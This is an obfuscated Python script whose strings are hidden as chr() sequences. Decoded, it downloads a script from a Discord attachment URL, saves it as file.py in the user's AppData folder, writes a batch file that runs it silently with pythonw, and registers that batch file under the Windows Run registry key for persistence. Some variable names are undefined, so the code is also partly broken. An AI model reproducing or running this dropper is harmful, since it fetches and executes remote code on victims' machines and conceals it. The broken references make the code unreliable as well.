import requests
FC=open
Fh=file
Fe=print
RO=requests.get
import os
RW=os.getenv
RQ=os.path
import winreg as reg
Fp=reg.CloseKey
Fs=reg.REG_SZ
FB=reg.SetValueEx
Fa=reg.KEY_ALL_ACCESS
Ff=reg.OpenKey
Rg=reg.HKEY_CURRENT_USER
def RT():
  Rb=RO(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(99),chr(100),chr(110),chr(46),chr(100),chr(105),chr(115),chr(99),chr(111),chr(114),chr(100),chr(97),chr(112),chr(112),chr(46),chr(99),chr(111),chr(109),chr(47),chr(97),chr(116),chr(116),chr(97),chr(99),chr(104),chr(109),chr(101),chr(110),chr(116),chr(115),chr(47),chr(49),chr(48),chr(56),chr(51),chr(55),chr(56),chr(51),chr(52),chr(52),chr(55),chr(50),chr(57),chr(49),chr(54),chr(50),chr(57),chr(54),chr(52),chr(48),chr(47),chr(49),chr(50),chr(54),chr(52),chr(51),chr(57),chr(48),chr(51),chr(52),chr(48),chr(53),chr(49),chr(56),chr(48),chr(56),chr(56),chr(55),chr(50),chr(53),chr(47),chr(109),chr(121),chr(95),chr(115),chr(99),chr(114),chr(105),chr(112),chr(116),chr(46),chr(112),chr(121),chr(63),chr(101),chr(120),chr(61),chr(54),chr(54),chr(57),chr(100),chr(98),chr(50),chr(99),chr(52),chr(38),chr(105),chr(115),chr(61),chr(54),chr(54),chr(57),chr(99),chr(54),chr(49),chr(52),chr(52),chr(38),chr(104),chr(109),chr(61),chr(102),chr(98),chr(100),chr(53),chr(54),chr(56),chr(99),chr(102),chr(102),chr(55),chr(100),chr(53),chr(49),chr(56),chr(52),chr(102),chr(57),chr(51),chr(52),chr(50),chr(57),chr(54),chr(99),chr(48),chr(97),chr(102),chr(49),chr(56),chr(56),chr(100),chr(53),chr(48),chr(52),chr(99),chr(101),chr(49),chr(57),chr(50),chr(101),chr(54),chr(98),chr(102),chr(102),chr(99),chr(97),chr(98),chr(57),chr(48),chr(52),chr(101),chr(48),chr(50),chr(49),chr(56),chr(51),chr(54),chr(49),chr(97),chr(56),chr(99),chr(51),chr(50),chr(102),chr(56),chr(38)]))                                                                                                                                                                                                  )
  if Rb.status_code==int("".join([chr(50),chr(48),chr(48)]))                        :
    Ri=RQ.join(RW(("".join([chr(65),chr(80),chr(80),chr(68),chr(65),chr(84),chr(65)]))                           ),("".join([chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115)]))                                                 )
    Rq=("".join([chr(102),chr(105),chr(108),chr(101),chr(46),chr(112),chr(121)]))
    with FC(RQ.join(Ri,Rq),("".join([chr(119),chr(98)]))                               )as Fh:
      Fh.write(Rb.content)
    Fe(f"Downloaded file saved as {file_name}")
    RY(Ri,Rq)
  else:
    Fe(f"Failed to download file. Status code: {response.status_code}")
def RY(Ri,Rq):
  RE=f"{file_path}\\{file_name}"
  RP=RQ.join(RW(("".join([chr(65),chr(80),chr(80),chr(68),chr(65),chr(84),chr(65)]))                         ),("".join([chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115)]))                                               )
  RU=("".join([chr(115),chr(116),chr(97),chr(114),chr(116),chr(117),chr(112),chr(95),chr(115),chr(99),chr(114),chr(105),chr(112),chr(116),chr(46),chr(98),chr(97),chr(116)]))
  with FC(RQ.join(RP,RU),("".join([chr(119)]))                            )as RJ:
    RJ.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')
  RA=Rg
  Rc=("".join([chr(83),chr(111),chr(102),chr(116),chr(119),chr(97),chr(114),chr(101),chr(92),chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115),chr(92),chr(67),chr(117),chr(114),chr(114),chr(101),chr(110),chr(116),chr(86),chr(101),chr(114),chr(115),chr(105),chr(111),chr(110),chr(92),chr(82),chr(117),chr(110)]))
  RL=Ff(RA,Rc,int("".join([chr(48)]))               ,Fa)
  FB(RL,("".join([chr(77),chr(121),chr(83),chr(116),chr(97),chr(114),chr(116),chr(117),chr(112),chr(83),chr(99),chr(114),chr(105),chr(112),chr(116)]))                         ,int("".join([chr(48)]))                           ,Fs,f"{bat_path}\\{bat_name}")
  Fp(RL)
